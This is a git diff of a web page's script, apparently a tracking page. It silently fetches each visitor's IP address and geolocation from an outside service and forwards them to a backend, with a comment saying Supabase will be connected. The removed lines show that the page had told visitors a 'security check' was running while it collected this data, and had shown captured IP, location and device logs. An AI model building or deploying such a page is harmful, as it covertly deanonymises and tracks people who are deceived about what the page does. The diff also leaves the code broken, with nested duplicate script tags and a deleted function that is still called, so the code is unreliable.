@@ -64,14 +64,13 @@
 </div>
 
 <script>
-    // Extract Operation ID from URL
+ <script>
     const urlParams = new URLSearchParams(window.location.search);
     const opID = urlParams.get('id') || "UNSET";
     document.getElementById('op-id').innerText = opID.toUpperCase();
 
     async function initTrace() {
         try {
-            // Collecting Metadata
             const res = await fetch("https://ipapi.co/json/");
             const data = await res.json();
 
@@ -84,47 +83,14 @@
                 timestamp: new Date().toISOString()
             };
 
-            // Log to console for debugging
             console.log("Telemetry captured:", payload);
-            
-            // Forwarding to your backend/database
-            await sendTelemetry(payload);
-
+            await sendTelemetry(payload); // Bu yerda Supabase ulanadi
         } catch (err) {
             console.error("Transmission failed:", err);
-            document.getElementById('status').innerText = "Security check completed.";
         }
     }
-
-    async function sendTelemetry(payload) {
-        // Here we will connect your Supabase or API
-        setTimeout(() => {
-            document.getElementById('status').innerText = "System secure. Redirecting...";
-        }, 1500);
-    }
-
     window.onload = initTrace;
-function fetchResults() {
-            const id = document.getElementById('op-input').value;
-            const resultsArea = document.getElementById('results-area');
-            
-            if(!id) return alert("Please enter an Operation ID");
-
-            resultsArea.innerHTML = `<p style="color: #00d9ff;">Searching for logs with ID: ${id}...</p>`;
-
-            // Bu yerda kelajakda Supabase'dan ma'lumotlarni tortib olamiz
-            // Hozircha namunaviy (mock) ma'lumot ko'rsatiladi:
-            setTimeout(() => {
-                resultsArea.innerHTML = `
-                    <div class="log-entry">
-                        <p><span class="label">IP:</span> 178.218.201.12</p>
-                        <p><span class="label">LOCATION:</span> Tashkent, Uzbekistan</p>
-                        <p><span class="label">DEVICE:</span> Windows 11 / Chrome</p>
-                        <p><span class="label">TIME:</span> ${new Date().toLocaleString()}</p>
-                    </div>
-                `;
-            }, 1000);
-        }
+</script>
 </script>
 
 </body>
